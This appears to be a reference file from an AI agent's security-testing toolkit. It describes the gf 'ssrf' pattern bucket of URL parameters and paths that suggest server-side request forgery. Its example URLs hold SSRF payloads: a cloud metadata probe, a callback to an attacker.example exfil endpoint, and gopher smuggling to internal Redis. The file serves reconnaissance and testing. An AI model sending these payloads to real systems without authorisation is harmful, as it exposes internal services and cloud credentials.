---
name: gf-patterns:ssrf
description: URL-fetch parameter patterns that signal server-side request forgery surfaces
origin: 1ndianl33t/Gf-Patterns (+ local overlay)
---

# gf: ssrf

## What this bucket classifies

Parameters and path fragments that hint the server takes an attacker-controlled URL and
fetches it server-side. These are the raw surfaces for SSRF against cloud metadata,
internal services, and cross-protocol smuggling (gopher/file/dict/ldap).

## Load this reference when

- The corpus contains at least one `url=`, `redirect=`, `callback=`, `feed=`, or `next=` query key
- Path fragments `/proxy/` or `/fetch/` appear in crawl or historical data
- Operator is choosing between `ssrf` and `redirect` buckets and needs tie-breaking context

## Parameter keys that match

`url, uri, host, port, path, redirect, feed, callback, data, continue, next, window, view,
link, src, dest`

## Path patterns that match

`/proxy/`, `/fetch/`

## Weight and priority interpretation

- Baseline priority score: 45 (second only to `rce`)
- Terminal reasons that suppress this bucket: `inert_type` (image/video/font/archive are skipped at ingest)

## Example URLs that match

- `https://target.example/api/fetch?url=http://evil.example` — ssrf via url=
- `https://target.example/image-proxy?src=http://169.254.169.254/latest/meta-data/` — cloud metadata probe
- `https://target.example/webhook/callback?callback=https://attacker.example/exfil` — callback control
- `https://target.example/proxy/anything?uri=gopher://internal:6379/_info` — protocol smuggling via proxy path
- `https://target.example/feed/load?feed=http://localhost:8500/v1/catalog/services` — Consul metadata via feed=

## What it does NOT classify

- Pure client-side redirect logic where the fetch happens in the browser (those land in `redirect`)
- OAuth `redirect_uri` alone without server-side fetching (that is the `redirect` bucket's signal)
- Image/video/font URLs — the ingest path marks them `inert_type` before classification runs

## Sources

- [1ndianl33t/Gf-Patterns](https://github.com/1ndianl33t/Gf-Patterns) — canonical community pattern set
- [tomnomnom/gf](https://github.com/tomnomnom/gf) — tool
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

## Related

- `agent/skills/ssrf-testing/SKILL.md` — the follow-up test skill
- `agent/references/gf-patterns/redirect.md` — adjacent bucket (client-side redirect vs server-side fetch)
- `agent/references/payloads/ssrf-payloads.md` — payload library once a surface is confirmed
